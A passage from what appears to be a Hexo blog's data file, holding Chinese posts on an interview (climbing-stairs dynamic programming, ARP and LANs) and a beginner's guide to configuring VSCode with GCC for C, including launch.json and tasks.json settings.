中，以后通信就能直接扔过去了。<br>至此，问题已经逐渐明朗，但有一个关键点，以上的讨论都是基于同一个<strong>局域网</strong>，而<strong>局域网</strong>和<strong>子网</strong>并无直接联系。</li>\n<li><strong>局域网</strong><br>这个概念非常广泛，一般来讲就是指一个小范围的网络，但这样事情就解释不通了，两台网线都不接的主机放在一起算不算同在一个局域网？说不清。<br>所以较真点讲局域网指的是<strong>VLAN</strong>（Virtual LAN），即<strong>虚拟局域网</strong>，虚拟局域网</li>\n</ol>\n<hr>\n<p>待更新…</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://blog.csdn.net/jeffleo/article/details/54174835\">https://blog.csdn.net/jeffleo/article/details/54174835</a></p>\n","excerpt":"<p>开局暴击</p>","more":"<h2 id=\"算法\"><a href=\"#算法\" class=\"headerlink\" title=\"算法\"></a>算法</h2><p>面试官给了我一道力扣上的动态规划题，虽然我之前浅浅看过，但没刷过题，一时确实做不出来，然后他换了一道标着“简单”的动规题———经典爬楼梯，still，我还是不会，甚至思路来到了传说中的——递归（逃</p>\n<p>直到面试结束后我才一拍脑门，原来递规与动归的区别是<strong>前者从后向前推，而后者从前向后推！</strong></p>\n<h3 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h3><blockquote>\n<p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。<br>每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？</p>\n</blockquote>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>不难看出，这题就是求一个<strong>斐波那契数列</strong>，即有<br>$$<br>    f(n) = f(n-1) + f(n-2)<br>$$<br>如果用递归，那么就是从 $f(n)$ 开始向前推，显然，这样的复杂度是 $O(2^n)$ 。<br>但如果考虑动规，那么就是从 $f(1)$ 开始向后推，不难看出，此时复杂度就神奇般变成了—— $O(n)$ 。</p>\n<h2 id=\"计算机网络\"><a href=\"#计算机网络\" class=\"headerlink\" title=\"计算机网络\"></a>计算机网络</h2><blockquote>\n<p>前段时间由于众所周知的原因，学校把我们平时用的论坛屏蔽了，具体表现在用校园网打不开论坛的网页。后来发现是内网 DNS 搞的鬼，也就兴致勃勃地研究起计算机网络来，上课摸鱼的时候粗略看了一下网络层与网络互连的内容，然后写简历的时候就作死住上填了个“计网初步”，再然后——我就寄了。（安详）——引子</p>\n</blockquote>\n<p><strong>问</strong>：同一个子网一台主机向另一台主机发送数据，这个数据是否会直接被转发到另一台主机？</p>\n<p>七层<strong>网络模型</strong>，从底到顶分别是：物理层，数据链路层，网络层，传输层，会话层，表示层，应用层（现在好像简化成四层来着），总之这个问题大概归到<strong>网络层和数据链路层</strong>的。<br>然后呢，答案就是，<strong>我不知道！</strong><br>其实呢，我一开始以为自己知道了，但越看越不知道了，最后可能得把整个计网翻上一遍才能彻底整明白了。（没错这就是传说中的递归学习）</p>\n<p>下面简单介绍几个概念，要理解这个问题就逃不开。</p>\n<ol>\n<li><strong>物理地址</strong><br>首先有一件事就是，IP 地址是<strong>逻辑网络</strong>上的东西，数据链路层是不能直接用的，就好像你要寄信给小 X 家，地址总不能直接填个“小 X 家”。而详细地址，在计网中叫<strong>物理地址</strong>，才是物理网络所认的标识。</li>\n<li><strong>ARP</strong><br>现在我们有了 IP 地址，就需要用<strong>ARP 协议</strong>(Address Resolution Protocol)来找到对应的物理地址。两者并非是简单的映射关系，而且也会动态变化，就像小 X 搬个家，那里就不叫小 X 家了，过一会搬个小 Y 来，又成了小 Y 家。</li>\n<li><strong>ARP cache</strong><br>为了解决这个问题，主机里就设置了个 <strong>ARP 高速缓存</strong>，即 ARP cache，上面存着本局域网上各主机和路由器的 <strong>IP 地址和物理地址的映射表</strong>。主机 A 向本局域网中的另一台主机 B 发送 IP 数据报时，就先看看里面有没有主机 B 的记录，有的话就好办了，把主机 B 的物理地址写入 MAC 帧里，然后丢进通信链路里就完事。<br>But 事情总不可能这么简单，有相当大的概率表上是没有主机 B 的，这时主机 A 就会在所在局域网上广播一个 <strong>ARP 请求分组</strong>，这个广播可以类似生活中广播的概念，可以做到无差别攻击，就是<strong>局域网上的所有主机</strong>都会收到。这个 ARP 请求分组上有<strong>主机 A 的 IP 地址和物理地址</strong>，也有<strong>主机 B 的 IP 地址</strong>，主机 B ，说这不是我嘛，当即发一个单播回去，很快啊，上面有<strong>主机 B 的 IP 地址和物理地址</strong>。注意到，由于已经收到包含主机 A 物理地址的 ARP 请求分组，所以主机 B 能精准投递到主机 A ，而不用再广播了。显然这时双方都知道对方的物理地址，就写进各自的 ARP cache 中，以后通信就能直接扔过去了。<br>至此，问题已经逐渐明朗，但有一个关键点，以上的讨论都是基于同一个<strong>局域网</strong>，而<strong>局域网</strong>和<strong>子网</strong>并无直接联系。</li>\n<li><strong>局域网</strong><br>这个概念非常广泛，一般来讲就是指一个小范围的网络，但这样事情就解释不通了，两台网线都不接的主机放在一起算不算同在一个局域网？说不清。<br>所以较真点讲局域网指的是<strong>VLAN</strong>（Virtual LAN），即<strong>虚拟局域网</strong>，虚拟局域网</li>\n</ol>\n<hr>\n<p>待更新…</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://blog.csdn.net/jeffleo/article/details/54174835\">https://blog.csdn.net/jeffleo/article/details/54174835</a></p>"},{"title":"VSCode 写 C","date":"2021-12-29T02:10:53.000Z","_content":"\n一句话：VSCode 确实是一个好东西\n<!--more-->\n## 前言\n\n> 在用 VSCode 前，我写 C 一直用的是 VS2019 ，直到我看见了 GZTime 学长写的 [Visual Studio Code Guide](https://blog.gztime.cc/posts/2020/6b9b4626/) 一文并照着配了后，我乐了，原来 VSCode 如此好用。首先作为一个编辑器，它比 VS2019 这个 IDE 小了太多（一个几十 MB ，一个 10 个 GB ），其次，它配上 gcc 可以避免 VS2019 由于 msvc 导致的 `scanf_s` 等一堆 `_s`（或许我的表述不是太严谨，但差不多是这个意思）。\n> 本文高度概括了学长的文章，说是转载也不为过，读者根据自身水平可酌情移步至[原文](https://blog.gztime.cc/posts/2020/6b9b4626/)。\n\n## 安装\n\n### 链接\n\n[下载链接](https://wwi.lanzouw.com/b00v71rpc)\n\n### 注意事项\n\n1. 安装 gcc 时**取消勾选** `Check for updated files on the TDM-GCC server`。\n2. 安装 VSCode 时在附加任务中“其他”中的**四项全部勾选**，即将用 Code 打开加入文件和文件夹添加入右键菜单中，并注册为受支持的文件类型的编辑器。\n3. 不推荐更改**默认文件夹**（别抠这点空间了）。\n\n### 普通配置\n\n安装好 VSCode 和 gcc 后，**重启电脑**，运行 VSCodeCppHelper ，如果你对在哪创建文件夹没有好的选择，就把 VSCodeCppHelper 放 C 盘随便一个地方里运行，然后傻瓜式 `enter` 。\n\n### 机房里配置\n\n> 由于 GZTime 学长写的 VSCodeCppHelper 小工具需要重启才能识别出 VSCode 和 gcc 的安装，但是机房的电脑一重启所有东西又会全部重置，此时便只能手动配置了。（以下均为转载）\n_更新：如今 VSCodeCppHelper 已经支持在没检测到环境变量的情况下进行配置了。_\n\n1. 打开 VSCode 至你的文件夹（此处以 `C:\\Coding` 为例）。\n2. 打开左侧 `Extensions` 选项卡，搜索 C++ 并安装 `C/C++` 和 `C/C++ Intellisence` 两个扩展。\n3. 在根目录新建文件夹 `Scripts` 以及 `Debug`\n4. 在 `Scripts` 文件夹中新建文件 helloworld.cpp ，写下传统的 helloworld 程序：\n\n    ```C++\n    #include <bits/stdc++.h>\n    using namespace std;\n    int main()\n    {\n      cout << \"Hello world!\" << endl;\n      return 0;\n    }\n    ```\n\n5. 单击左侧菜单中的运行并点击运行和调试，选择 **C++(GDB/LLDB)** 。\n6. 此时 VSCode 会在你的根目录下新建 `.vscode` 文件夹，此文件夹中用于存放 VSCode 的相关配置文件，打开 `launch.json` 替换或修改为如下内容：\n\n    ```json\n    {\n      // 使用 IntelliSense 了解相关属性。\n      // 悬停以查看现有属性的描述。\n      // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387\n      \"version\": \"0.2.0\",\n      \"configurations\": [\n      \n\n        {\n          \"name\": \"C++ Run\",\n          \"type\": \"cppdbg\",\n          \"request\": \"launch\",\n          \"program\": \"${workspaceRoot}/Debug/${fileBasenameNoExtension}.exe\", //运行文件的路径\n          \"args\": [],\n          \"stopAtEntry\": false,\n          \"cwd\": \"${workspaceFolder}\",\n          \"environment\": [],\n          \"console\": \"internalConsole\",\n          \"internalConsoleOptions\": \"neverOpen\",\n          \"MIMode\": \"gdb\",\n          \"miDebuggerPath\": \"C:/TDM-GCC-64/gdb64/bin/gdb.exe\",\n          \"setupCommands\": [\n            {\n              \"description\": \"为 gdb 启用整齐打印\",\n              \"text\": \"-enable-pretty-printing\",\n              \"ignoreFailures\": true\n            }\n          ],\n          \"preLaunchTask\": \"Compile\" //运行前需要完成的任务\n        },\n        {\n          \"name\": \"C Run\",\n          \"type\": \"cppdbg\",\n          \"request\": \"launch\",\n          \"program\": \"${workspaceRoot}/Debug/${fileBasenameNoExtension}.exe\", //运行文件的路径\n          \"args\": [],\n          \"stopAtEntry\": false,\n          \"cwd\": \"${workspaceFolder}\",\n          \"environment\": [],\n          \"console\": \"internalConsole\",\n          \"internalConsoleOptions\": \"neverOpen\",\n          \"MIMode\": \"gdb\",\n          \"miDebuggerPath\": \"C:/TDM-GCC-64/gdb64/bin/gdb.exe\",\n          \"setupCommands\": [\n            {\n              \"description\": \"为 gdb 启用整齐打印\",\n              \"text\": \"-enable-pretty-printing\",\n              \"ignoreFailures\": true\n            }\n          ],\n          \"preLaunchTask\": \"Compile_C\" //运行前需要完成的任务\n        }\n      ]\n    }\n    ```\n\n7. 在 `.vscode` 文件夹中新建文件 `tasks.json` 并输入如下内容：\n\n    ```json\n    {\n      \"version\": \"2.0.0\",\n      \"tasks\": [\n        {\n          \"label\": \"Compile\",\n          \"command\": \"g++\",\n          \"args\": [\n            \"-g\",\n            \"${file}\", //指定编译源代码文件\n            \"-o\",\n            \"${workspaceRoot}\\\\Debug\\\\${fileBasenameNoExtension}.exe\", // 指定输出文件名，不加该参数则默认输出a.exe\n            \"-ggdb3\", // 生成和调试有关的信息\n            \"-Wall\", // 开启额外警告\n            \"-static-libgcc\", // 静态链接\n            \"-std=c++2a\",\n            \"-Wno-format\",\n            \"-finput-charset=UTF-8\", //输入编译器文本编码 默认为UTF-8\n            \"-fexec-charset=UTF-8\" //编译器输出文本编码 自行选择\n          ],\n\n          \"type\": \"shell\",\n\n          \"presentation\": {\n            \"echo\": true,\n            \"reveal\": \"silent\", // 在“终端”中显示编译信息的策略，可以为always，silent，never\n            \"focus\": false,\n            \"panel\": \"shared\", // 不同的文件的编译信息共享一个终端面板\n            \"clear\": true,\n            \"showReuseMessage\": true\n          },\n\n          \"problemMatcher\": {\n            \"owner\": \"cpp\",\n            \"fileLocation\": [\"relative\", \"\\\\\"],\n            \"pattern\": {\n              \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",\n              \"file\": 1,\n              \"line\": 2,\n              \"column\": 3,\n              \"severity\": 4,\n              \"message\": 5\n            }\n          }\n        },\n        {\n          \"label\": \"Compile_C\",\n          \"command\": \"gcc\",\n          \"args\": [\n            \"-g\",\n            \"${file}\", //指定编译源代码文件\n            \"-o\",\n            \"${workspaceRoot}\\\\Debug\\\\${fileBasenameNoExtension}.exe\", // 指定输出文件名，不加该参数则默认输出a.exe\n            \"-ggdb3\", // 生成和调试有关的信息\n            \"-Wall\", // 开启额外警告\n            \"-static-libgcc\", // 静态链接\n            \"-Wno-format\",\n            \"-finput-charset=UTF-8\", //输入编译器文本编码 默认为UTF-8\n            \"-fexec-charset=UTF-8\" //编译器输出文本编码 自行选择\n          ],\n\n          \"type\": \"shell\",\n\n          \"presentation\": {\n            \"echo\": true,\n            \"reveal\": \"silent\", // 在“终端”中显示编译信息的策略，可以为always，silent，never\n            \"focus\": false,\n            \"panel\": \"shared\", // 不同的文件的编译信息共享一个终端面板\n            \"clear\": true,\n            \"showReuseMessage\": true\n          },\n\n          \"problemMatcher\": {\n            \"owner\": \"cpp\",\n            \"fileLocation\": [\"relative\", \"\\\\\"],\n            \"pattern\": {\n              \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",\n              \"file\": 1,\n              \"line\": 2,\n              \"column\": 3,\n              \"severity\": 4,\n              \"message\": 5\n            }\n          }\n        }\n      ]\n    }\n    ```\n\n8. 类似的，配置 `c_cpp_properties.json` ，这个我不知道要不要（逃\n\n    ```json\n    {\n      \"configurations\": [\n        {\n          \"name\": \"Win32\",\n          \"includePath\": [\n            \"${workspaceFolder}/**\"\n          ],\n          \"defines\": [\n            \"_DEBUG\",\n            \"UNICODE\",\n            \"_UNICODE\"\n          ],\n          \"compilerPath\": \"C:/TDM-GCC-64/bin/g++.exe\",\n          \"cStandard\": \"c11\",\n          \"cppStandard\": \"c++20\",\n          \"intelliSenseMode\": \"gcc-x64\",\n          \"macFrameworkPath\": [],\n          \"browse\": {\n            \"path\": [\n              \"C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/*\",\n              \"C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/c++/*\"\n            ]\n          }\n        }\n      ],\n      \"version\": 4\n    }\n    ```\n\n搬砖完毕（逃\n\n## 中文乱码\n\nVSCode 中默认终端常为 PowerShell ，Windows 10 中 PowerShell 默认编码跟随系统，可以通过修改区域设置来改变默认编码： 控制面板->区域->更改系统区域设置->勾选 `Beta版：使用Unicode:UTF-8以获取全球语言支持`，但这样可能会造成其他应用乱码，笔者就因为这个事情改回去了。\n\n## VSCode 使用的注意事项\n\n> 虽说 VSCode 好，但有几点注意的，被坑过。。。\n\n1. 不要直接**在文件夹双击打开 .c 文件**启动 VSCode\n2. 不要给 .c 文件起**中文名**\n3. 不要在**其他文件夹**（除了你最初配置好的文件夹，比如桌面）中启动 VSCode\n4. 以上配置无法进行**多文件编译**\n5. 以上说法仅针对初学者，均不严谨\n\n## 参考\n\n> [Visual Studio Code Guide](https://blog.gztime.cc/posts/2020/6b9b4626/) by GZTime\n<https://blog.csdn.net/m0_55005568/article/details/119960552>\n","source":"_posts/VSCode 写 C.md","raw":"---\ntitle: VSCode 写 C\ndate: 2021-12-29 10:10:53\ntags: [VSCode, C]\ncategories: 环境搭建\n---\n\n一句话：VSCode 确实是一个好东西\n<!--more-->\n## 前言\n\n> 在用 VSCode 前，我写 C 一直用的是 VS2019 ，直到我看见了 GZTime 学长写的 [Visual Studio Code Guide](https://blog.gztime.cc/posts/2020/6b9b4626/) 一文并照着配了后，我乐了，原来 VSCode 如此好用。首先作为一个编辑器，它比 VS2019 这个 IDE 小了太多（一个几十 MB ，一个 10 个 GB ），其次，它配上 gcc 可以避免 VS2019 由于 msvc 导致的 `scanf_s` 等一堆 `_s`（或许我的表述不是太严谨，但差不多是这个意思）。\n> 本文高度概括了学长的文章，说是转载也不为过，读者根据自身水平可酌情移步至[原文](https://blog.gztime.cc/posts/2020/6b9b4626/)。\n\n## 安装\n\n### 链接\n\n[下载链接](https://wwi.lanzouw.com/b00v71rpc)\n\n### 注意事项\n\n1. 安装 gcc 时**取消勾选** `Check for updated files on the TDM-GCC server`。\n2. 安装 VSCode 时在附加任务中“其他”中的**四项全部勾选**，即将用 Code 打开加入文件和文件夹添加入右键菜单中，并注册为受支持的文件类型的编辑器。\n3. 不推荐更改**默认文件夹**（别抠这点空间了）。\n\n### 普通配置\n\n安装好 VSCode 和 gcc 后，**重启电脑**，运行 VSCodeCppHelper ，如果你对在哪创建文件夹没有好的选择，就把 VSCodeCppHelper 放 C 盘随便一个地方里运行，然后傻瓜式 `enter` 。\n\n### 机房里配置\n\n> 由于 GZTime 学长写的 VSCodeCppHelper 小工具需要重启才能识别出 VSCode 和 gcc 的安装，但是机房的电脑一重启所有东西又会全部重置，此时便只能手动配置了。（以下均为转载）\n_更新：如今 VSCodeCppHelper 已经支持在没检测到环境变量的情况下进行配置了。_\n\n1. 打开 VSCode 至你的文件夹（此处以 `C:\\Coding` 为例）。\n2. 打开左侧 `Extensions` 选项卡，搜索 C++ 并安装 `C/C++` 和 `C/C++ Intellisence` 两个扩展。\n3. 在根目录新建文件夹 `Scripts` 以及 `Debug`\n4. 在 `Scripts` 文件夹中新建文件 helloworld.cpp ，写下传统的 helloworld 程序：\n\n    ```C++\n    #include <bits/stdc++.h>\n    using namespace std;\n    int main()\n    {\n      cout << \"Hello world!\" << endl;\n      return 0;\n    }\n    ```\n\n5. 单击左侧菜单中的运行并点击运行和调试，选择 **C++(GDB/LLDB)** 。\n6. 此时 VSCode 会在你的根目录下新建 `.vscode` 文件夹，此文件夹中用于存放 VSCode 的相关配置文件，打开 `launch.json` 替换或修改为如下内容：\n\n    ```json\n    {\n      // 使用 IntelliSense 了解相关属性。\n      // 悬停以查看现有属性的描述。\n      // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387\n      \"version\": \"0.2.0\",\n      \"configurations\": [\n      \n\n        {\n          \"name\": \"C++ Run\",\n          \"type\": \"cppdbg\",\n          \"request\": \"launch\",\n          \"program\": \"${workspaceRoot}/Debug/${fileBasenameNoExtension}.exe\", //运行文件的路径\n          \"args\": [],\n          \"stopAtEntry\": false,\n          \"cwd\": \"${workspaceFolder}\",\n          \"environment\": [],\n          \"console\": \"internalConsole\",\n          \"internalConsoleOptions\": \"neverOpen\",\n          \"MIMode\": \"gdb\",\n          \"miDebuggerPath\": \"C:/TDM-GCC-64/gdb64/bin/gdb.exe\",\n          \"setupCommands\": [\n            {\n              \"description\": \"为 gdb 启用整齐打印\",\n              \"text\": \"-enable-pretty-printing\",\n              \"ignoreFailures\": true\n            }\n          ],\n          \"preLaunchTask\": \"Compile\" //运行前需要完成的任务\n        },\n        {\n          \"name\": \"C Run\",\n          \"type\": \"cppdbg\",\n          \"request\": \"launch\",\n          \"program\": \"${workspaceRoot}/Debug/${fileBasenameNoExtension}.exe\", //运行文件的路径\n          \"args\": [],\n          \"stopAtEntry\": false,\n          \"cwd\": \"${workspaceFolder}\",\n          \"environment\": [],\n          \"console\": \"internalConsole\",\n          \"internalConsoleOptions\": \"neverOpen\",\n          \"MIMode\": \"gdb\",\n          \"miDebuggerPath\": \"C:/TDM-GCC-64/gdb64/bin/gdb.exe\",\n          \"setupCommands\": [\n            {\n              \"description\": \"为 gdb 启用整齐打印\",\n              \"text\": \"-enable-pretty-printing\",\n              \"ignoreFailures\": true\n            }\n          ],\n          \"preLaunchTask\": \"Compile_C\" //运行前需要完成的任务\n        }\n      ]\n    }\n    ```\n\n7. 在 `.vscode` 文件夹中新建文件 `tasks.json` 并输入如下内容：\n\n    ```json\n    {\n      \"version\": \"2.0.0\",\n      \"tasks\": [\n        {\n          \"label\": \"Compile\",\n          \"command\": \"g++\",\n          \"args\": [\n            \"-g\",\n            \"${file}\", //指定编译源代码文件\n            \"-o\",\n            \"${workspaceRoot}\\\\Debug\\\\${fileBasenameNoExtension}.exe\", // 指定输出文件名，不加该参数则默认输出a.exe\n            \"-ggdb3\", // 生成和调试有关的信息\n            \"-Wall\", // 开启额外警告\n            \"-static-libgcc\", // 静态链接\n            \"-std=c++2a\",\n            \"-Wno-format\",\n            \"-finput-charset=UTF-8\", //输入编译器文本编码 默认为UTF-8\n            \"-fexec-charset=UTF-8\" //编译器输出文本编码 自行选择\n          ],\n\n          \"type\": \"shell\",\n\n          \"presentation\": {\n            \"echo\": true,\n            \"reveal\": \"silent\", // 在“终端”中显示编译信息的策略，可以为always，silent，never\n            \"focus\": false,\n            \"panel\": \"shared\", // 不同的文件的编译信息共享一个终端面板\n            \"clear\": true,\n            \"showReuseMessage\": true\n          },\n\n          \"problemMatcher\": {\n            \"owner\": \"cpp\",\n            \"fileLocation\": [\"relative\", \"\\\\\"],\n            \"pattern\": {\n              \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",\n              \"file\": 1,\n              \"line\": 2,\n              \"column\": 3,\n              \"severity\": 4,\n              \"message\": 5\n            }\n          }\n        },\n        {\n          \"label\": \"Compile_C\",\n          \"command\": \"gcc\",\n          \"args\": [\n            \"-g\",\n            \"${file}\", //指定编译源代码文件\n            \"-o\",\n            \"${workspaceRoot}\\\\Debug\\\\${fileBasenameNoExtension}.exe\", // 指定输出文件名，不加该参数则默认输出a.exe\n            \"-ggdb3\", // 生成和调试有关的信息\n            \"-Wall\", // 开启额外警告\n            \"-static-libgcc\", // 静态链接\n            \"-Wno-format\",\n            \"-finput-charset=UTF-8\", //输入编译器文本编码 默认为UTF-8\n            \"-fexec-charset=UTF-8\" //编译器输出文本编码 自行选择\n          ],\n\n          \"type\": \"shell\",\n\n          \"presentation\": {\n            \"echo\": true,\n            \"reveal\": \"silent\", // 在“终端”中显示编译信息的策略，可以为always，silent，never\n            \"focus\": false,\n            \"panel\": \"shared\", // 不同的文件的编译信息共享一个终端面板\n            \"clear\": true,\n            \"showReuseMessage\": true\n          },\n\n          \"problemMatcher\": {\n            \"owner\": \"cpp\",\n            \"fileLocation\": [\"relative\", \"\\\\\"],\n            \"pattern\": {\n              \"regexp\": \"^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$\",\n              \"file\": 1,\n              \"line\": 2,\n              \"column\": 3,\n              \"severity\": 4,\n              \"message\": 5\n            }\n          }\n        }\n      ]\n    }\n    ```\n\n8. 类似的，配置 `c_cpp_properties.json` ，这个我不知道要不要（逃\n\n    ```json\n    {\n      \"configurations\": [\n        {\n          \"name\": \"Win32\",\n          \"includePath\": [\n            \"${workspaceFolder}/**\"\n          ],\n          \"defines\": [\n            \"_DEBUG\",\n            \"UNICODE\",\n            \"_UNICODE\"\n          ],\n          \"compilerPath\": \"C:/TDM-GCC-64/bin/g++.exe\",\n          \"cStandard\": \"c11\",\n          \"cppStandard\": \"c++20\",\n          \"intelliSenseMode\": \"gcc-x64\",\n          \"macFrameworkPath\": [],\n          \"browse\": {\n            \"path\": [\n              \"C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/*\",\n              \"C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/c++/*\"\n            ]\n          }\n        }\n      ],\n      \"version\": 4\n    }\n    ```\n\n搬砖完毕（逃\n\n## 中文乱码\n\nVSCode 中默认终端常为 PowerShell ，Windows 10 中 PowerShell 默认编码跟随系统，可以通过修改区域设置来改变默认编码： 控制面板->区域->更改系统区域设置->勾选 `Beta版：使用Unicode:UTF-8以获取全球语言支持`，但这样可能会造成其他应用乱码，笔者就因为这个事情改回去了。\n\n## VSCode 使用的注意事项\n\n> 虽说 VSCode 好，但有几点注意的，被坑过。。。\n\n1. 不要直接**在文件夹双击打开 .c 文件**启动 VSCode\n2. 不要给 .c 文件起**中文名**\n3. 不要在**其他文件夹**（除了你最初配置好的文件夹，比如桌面）中启动 VSCode\n4. 以上配置无法进行**多文件编译**\n5. 以上说法仅针对初学者，均不严谨\n\n## 参考\n\n> [Visual Studio Code Guide](https://blog.gztime.cc/posts/2020/6b9b4626/) by GZTime\n<https://blog.csdn.net/m0_55005568/article/details/119960552>\n","slug":"VSCode 写 C","published":1,"updated":"2022-11-27T11:15:31.886Z","_id":"clazajjr2000jyo6g1q9qc2fl","comments":1,"layout":"post","photos":[],"content":"<p>一句话：VSCode 确实是一个好东西</p>\n<span id=\"more\"></span>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>在用 VSCode 前，我写 C 一直用的是 VS2019 ，直到我看见了 GZTime 学长写的 <a href=\"https://blog.gztime.cc/posts/2020/6b9b4626/\">Visual Studio Code Guide</a> 一文并照着配了后，我乐了，原来 VSCode 如此好用。首先作为一个编辑器，它比 VS2019 这个 IDE 小了太多（一个几十 MB ，一个 10 个 GB ），其次，它配上 gcc 可以避免 VS2019 由于 msvc 导致的 <code>scanf_s</code> 等一堆 <code>_s</code>（或许我的表述不是太严谨，但差不多是这个意思）。<br>本文高度概括了学长的文章，说是转载也不为过，读者根据自身水平可酌情移步至<a href=\"https://blog.gztime.cc/posts/2020/6b9b4626/\">原文</a>。</p>\n</blockquote>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><h3 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h3><p><a href=\"https://wwi.lanzouw.com/b00v71rpc\">下载链接</a></p>\n<h3 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h3><ol>\n<li>安装 gcc 时<strong>取消勾选</strong> <code>Check for updated files on the TDM-GCC server</code>。</li>\n<li>安装 VSCode 时在附加任务中“其他”中的<strong>四项全部勾选</strong>，即将用 Code 打开加入文件和文件夹添加入右键菜单中，并注册为受支持的文件类型的编辑器。</li>\n<li>不推荐更改<strong>默认文件夹</strong>（别抠这点空间了）。</li>\n</ol>\n<h3 id=\"普通配置\"><a href=\"#普通配置\" class=\"headerlink\" title=\"普通配置\"></a>普通配置</h3><p>安装好 VSCode 和 gcc 后，<strong>重启电脑</strong>，运行 VSCodeCppHelper ，如果你对在哪创建文件夹没有好的选择，就把 VSCodeCppHelper 放 C 盘随便一个地方里运行，然后傻瓜式 <code>enter</code> 。</p>\n<h3 id=\"机房里配置\"><a href=\"#机房里配置\" class=\"headerlink\" title=\"机房里配置\"></a>机房里配置</h3><blockquote>\n<p>由于 GZTime 学长写的 VSCodeCppHelper 小工具需要重启才能识别出 VSCode 和 gcc 的安装，但是机房的电脑一重启所有东西又会全部重置，此时便只能手动配置了。（以下均为转载）<br><em>更新：如今 VSCodeCppHelper 已经支持在没检测到环境变量的情况下进行配置了。</em></p>\n</blockquote>\n<ol>\n<li><p>打开 VSCode 至你的文件夹（此处以 <code>C:\\Coding</code> 为例）。</p>\n</li>\n<li><p>打开左侧 <code>Extensions</code> 选项卡，搜索 C++ 并安装 <code>C/C++</code> 和 <code>C/C++ Intellisence</code> 两个扩展。</p>\n</li>\n<li><p>在根目录新建文件夹 <code>Scripts</code> 以及 <code>Debug</code></p>\n</li>\n<li><p>在 <code>Scripts</code> 文件夹中新建文件 helloworld.cpp ，写下传统的 helloworld 程序：</p>\n <figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;Hello world!&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n<li><p>单击左侧菜单中的运行并点击运行和调试，选择 <strong>C++(GDB/LLDB)</strong> 。</p>\n</li>\n<li><p>此时 VSCode 会在你的根目录下新建 <code>.vscode</code> 文件夹，此文件夹中用于存放 VSCode 的相关配置文件，打开 <code>launch.json</code> 替换或修改为如下内容：</p>\n <figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">// 使用 IntelliSense 了解相关属性。</span></span><br><span class=\"line\">  <span class=\"comment\">// 悬停以查看现有属性的描述。</span></span><br><span class=\"line\">  <span class=\"comment\">// 欲了解更多信息，请访问: 